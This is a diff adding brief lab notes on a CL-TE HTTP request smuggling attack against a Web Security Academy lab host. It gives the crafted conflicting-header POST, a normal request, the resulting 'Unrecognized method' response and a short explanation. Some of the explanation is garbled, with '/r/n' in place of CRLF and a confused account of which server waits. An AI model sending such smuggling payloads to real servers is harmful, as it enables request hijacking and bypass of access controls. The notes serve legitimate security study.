@@ -1,0 +1,39 @@
+CL-TE attack
+______________
+
+Attack Request
+---------------
+POST / HTTP/1.1
+Host: 0a35005603fa41c184c5a59200e30056.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+Transfer-Encoding: chunked
+/r/n
+0/r/n
+/r/n
+fuckyou
+
+0 to fuckyou is content-length = 12
+
+Normal Request
+--------------
+POST / HTTP/1.1
+Host: 0a35005603fa41c184c5a59200e30056.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+
+Because of using target-encoding: chuncked in attack request, the backend server pause and wait another chunk (request)
+When normal request is attrived > fuckyou is transfered to that request and sever responds > Unrecognized method FUCKYOUPOST
+
+Response
+---------
+HTTP/1.1 403 Forbidden
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 33
+
+"Unrecognized method FUCKYOUPOST"
+__________________________________________________________________________________________________________________________________________________________________
